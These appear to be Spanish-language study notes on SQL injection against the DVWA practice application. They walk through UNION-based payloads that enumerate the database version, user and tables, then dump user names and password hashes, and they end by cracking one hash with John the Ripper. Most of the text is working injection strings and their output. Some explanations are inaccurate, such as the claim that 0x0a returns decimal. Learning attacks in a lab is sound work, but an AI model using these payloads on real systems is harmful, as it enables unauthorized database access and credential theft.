Continuando con ataque de inyection de codigo

para html =
    $getid = "
    SELECT first_name, last_name
    FROM users
    WHERE user_id = %' or '0' = '0'

    UNION SELECT null, version() #
    (con este null e union combinamos tablas y columnas de la
    databese y con version traemos la version)


#    ID: %' or '0' = '0'      UNION SELECT null, version() #
#    First name:
#    Surname: 5.0.51a-3ubuntu5
# esta fue la respuesta del query

    WHERE user_id = %' or '0' = '0'
    UNION SELECT null, user() #
    (aqui cambiamos version por user )

    ID: %' or '0' = '0'     UNION SELECT null, user() #
        First name:
        Surname: root@localhost



    WHERE user_id = %' or '0' = '0'
    UNION SELECT null, database() #
    (aqui cambiamos user por databese )
    ID: %' or '0' = '0'     UNION SELECT null, database() #
                First name:
                Surname: dvwa

nota = aqui estamos pasando funciones y tambien podemos pasar
    le parametros a esas funciones


    UNION SELECT null,
    (
    con el UNION unimos tablas y con null una fila mas
    las segunda variable es la funcion que estamos ejecutando
    )

    table_name form information_schema.tables #
    (
    information_schema es una base de datos interna de MySQL
    y con el punto le decimos que nos traiga una parte o un
    objeto que contiene esa base de datos
    con table_name queremos que nos traiga los nombres de
    information_schema (esta es la que tiene los nombres de
    todas las tablas de datos ) aqui lo que estamos haciendo
    es obtener una lista de todas la tablas que tiene esta
    database
    )


    %' or '0' = '0'
    UNION SELECT null,
    table_name from information_schema.tables #


            respuesta ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
            ID: %' or '0' = '0'         UNION SELECT null,      table_name from information_schema.tables #
    First name:
    Surname: users_permissions

    ID: %' or '0' = '0'         UNION SELECT null,      table_name from information_schema.tables #
    First name:
    Surname: users_usergroups

    ID: %' or '0' = '0'         UNION SELECT null,      table_name from information_schema.tables #
    First name:
    Surname: users_users

        aqui vemos los nombres de las tablas de datos
        lo que nos interesa por ahora son las tablas
        con usuarios y passwords


    %' or '0' = '0'
    UNION SELECT null,
    table_name from information_schema.tables
    WHERE table_name like 'user%'#

        aqui estamos filtrando las tablas con los user

respuesta ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`

ID: %' or '0' = '0'         UNION SELECT null,      table_name from information_schema.tables      WHERE table_name like 'user%'#
First name: admin
Surname: admin

ID: %' or '0' = '0'         UNION SELECT null,      table_name from information_schema.tables      WHERE table_name like 'user%'#
First name: Gordon
Surname: Brown

ID: %' or '0' = '0'         UNION SELECT null,      table_name from information_schema.tables      WHERE table_name like 'user%'#
First name: Hack
Surname: Me


aqui con el filtro solo esta mostrando las tablas que
tienen informacion de usuarios




vamos a cambiar or por and y 0 por 1 para que no me traigan


    %' and '1' = '0'
    UNION SELECT null,
    CONCAT(table_name,0x0a, column_name)
    FROM information_schema.columns
    WHERE table_name = 'users' #

    vamos a contatenar mas tablas
    0x0a es que lo traiga en decimal los nombres de la
    tabla users  que esta en information_schema de
    la tabla llamda columns


        respuesta ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        ID: %' and '1' = '0'         UNION SELECT null,      CONCAT(table_name,0x0a, column_name)     FROM information_schema.columns     WHERE table_name = 'users' #
        First name:
        Surname: users
        user_id

        aqui traimos
        Surname =  users (nombre de la tabla)
        user_id = esta son las columnas de las tablas




        %' and '1' = '0'
        UNION SELECT null,
        CONCAT(
        first_name,0x0a,
        last_name,0x0a,
        user,0x0a,
        password)
        FROM users #


        0x0a = es poner un salto de linea
        '1' = '0'  le estamos enviando un false para que
        no nos devuelva los valores de la tabla original

        UNION SELECT null,
            siempre debe ser null para que este en vasio
            y pueda leer toda la database

        CONCAT para concatenar la informacion que queremos
            ver y 0x0a es para el salto de linea


            respuesta ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        ID: %' and '1' = '0'             UNION SELECT null,          CONCAT(         first_name,0x0a,         last_name,0x0a,         user,0x0a,         password)         FROM users #

            First name:
            Surname: admin
            admin
            admin
            5f4dcc3b5aa765d61d8327deb882cf99

        el password lo trae cifrado


        root@edwin:~/Documents# nano hashdvwa
        creamos un archivo para hacerle brute force
        Proceeding with wordlist:/usr/share/john/
        password.lst, rules:Wordlist
            esta es la contrasena = password


        
 '
";
